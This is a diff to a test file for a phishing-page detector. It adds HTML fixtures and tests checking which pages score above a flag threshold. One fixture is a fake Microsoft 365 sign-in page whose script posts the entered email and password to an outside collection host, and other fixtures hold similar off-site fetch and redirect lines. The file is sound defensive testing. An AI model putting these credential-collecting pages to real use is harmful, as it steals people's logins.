@@ -57,6 +57,42 @@ const FAKE_PAYPAL_VERIFY = `<!doctype html>
   </form>
 </body></html>`;
 
+// The one the 31 August review built by hand and watched score 30: a logo
+// instead of the word, no <form action> at all, and a few lines of JavaScript
+// that read the box and post it somewhere else. Every part of it is the part
+// the original signals do not look at.
+const JS_CREDENTIAL_COLLECTOR = `<!doctype html>
+<html><head><title>Document access</title></head>
+<body>
+  <img src="/logo.png" alt="Microsoft 365">
+  <h1>Sign in to view this document</h1>
+  <input id="u" type="email" placeholder="Email">
+  <input id="p" type="password" placeholder="Password">
+  <button onclick="go()">Continue</button>
+  <script>
+    function go() {
+      fetch('https://collect-cdn-metrics.tk/i', {
+        method: 'POST',
+        body: JSON.stringify({ u: document.getElementById('u').value,
+                               p: document.getElementById('p').value }),
+      });
+    }
+  </script>
+</body></html>`;
+
+// The acceptable false positive, kept as a fixture so the cost of the rule is
+// written down rather than remembered: a real product's own login screen,
+// pitched in a deck, with an analytics frame in the corner. It scores above
+// the threshold and it should — a human glances at it once and closes it.
+const BRANDED_LOGIN_PROTOTYPE = `<!doctype html>
+<html><head><title>Acme — sign in prototype</title></head>
+<body>
+  <h1>Sign in with your Google account</h1>
+  <p>This is the screen your team sees on day one.</p>
+  <input type="password" placeholder="Password">
+  <iframe src="https://analytics.example.net/p" width="0" height="0"></iframe>
+</body></html>`;
+
 const OBFUSCATED_REDIRECTOR = `<!doctype html>
 <html><head>
   <meta http-equiv="refresh" content="3;url=https://collect.example-bad.tk/go">
@@ -133,6 +169,26 @@ describe('screenHtml — the documents it must flag', () => {
     expect(score).toBeGreaterThanOrEqual(SCREEN_FLAG_THRESHOLD);
   });
 
+  // A logo, a password box and four lines of JavaScript: no <form action>
+  // anywhere, which is what the form signal alone could never see.
+  it('scores a JavaScript credential collector with a logo above the threshold', () => {
+    const { score, signals } = screenHtml(JS_CREDENTIAL_COLLECTOR);
+    expect(signals).toContain('password-input');
+    expect(signals).toContain('brand-login-wording');
+    expect(signals).toContain('exfiltration-script');
+    expect(signals).not.toContain('cross-domain-form-action');
+    expect(score).toBeGreaterThanOrEqual(SCREEN_FLAG_THRESHOLD);
+  });
+
+  // The brand is only in the alt text. Take that away and the same page is 55,
+  // which still flags — the alt text is what makes it read as an imitation
+  // rather than as a login box.
+  it('reads a brand out of an image alt attribute', () => {
+    const withoutAlt = JS_CREDENTIAL_COLLECTOR.replace('alt="Microsoft 365"', 'alt=""');
+    expect(screenHtml(withoutAlt).signals).not.toContain('brand-login-wording');
+    expect(screenHtml(JS_CREDENTIAL_COLLECTOR).score).toBeGreaterThan(screenHtml(withoutAlt).score);
+  });
+
   it('scores an obfuscated off-site redirector above the threshold', () => {
     const { score, signals } = screenHtml(OBFUSCATED_REDIRECTOR);
     expect(signals).toEqual(['obfuscated-script', 'meta-refresh-external']);
@@ -167,6 +223,24 @@ describe('screenHtml — the documents it must leave alone', () => {
     expect(score).toBeLessThan(SCREEN_FLAG_THRESHOLD);
   });
 
+  // Deliberately not "leave alone": it is here to record what the rule costs.
+  it('flags a legitimate branded login prototype, which is the accepted cost', () => {
+    const { score } = screenHtml(BRANDED_LOGIN_PROTOTYPE);
+    expect(score).toBeGreaterThanOrEqual(SCREEN_FLAG_THRESHOLD);
+  });
+
+  // The shape that would be expensive to get wrong: a page that reads a form
+  // and posts it to the same place it already loads code from is a product,
+  // not a collector.
+  it('leaves a form that posts to a domain the document already names alone', () => {
+    const html = `<script src="https://api.acme.com/sdk.js"></script>
+      <input type="password">
+      <script>fetch('https://api.acme.com/session', { body: document.forms[0].elements[0].value });</script>`;
+    const { score, signals } = screenHtml(html);
+    expect(signals).not.toContain('exfiltration-script');
+    expect(score).toBeLessThan(SCREEN_FLAG_THRESHOLD);
+  });
+
   it('scores a page of plain prose at zero', () => {
     expect(screenHtml(PLAIN_TEXT_PAGE)).toEqual({ score: 0, signals: [] });
   });
@@ -198,6 +272,8 @@ describe('screenHtml — the invariant the threshold rests on', () => {
       `<meta http-equiv="refresh" content="0;url=https://elsewhere.example.net/">`,
       `<script>unescape('%u4141')</script>`,
       `<h1>Microsoft</h1><p>Sign in below.</p>`,
+      `<img alt="PayPal"><p>Log in to continue.</p>`,
+      `<input type="text" id="q"><script>fetch('https://elsewhere.example.net/c', { body: document.getElementById('q').value });</script>`,
     ];
     for (const html of oneSignalEach) {
       const { score, signals } = screenHtml(html);
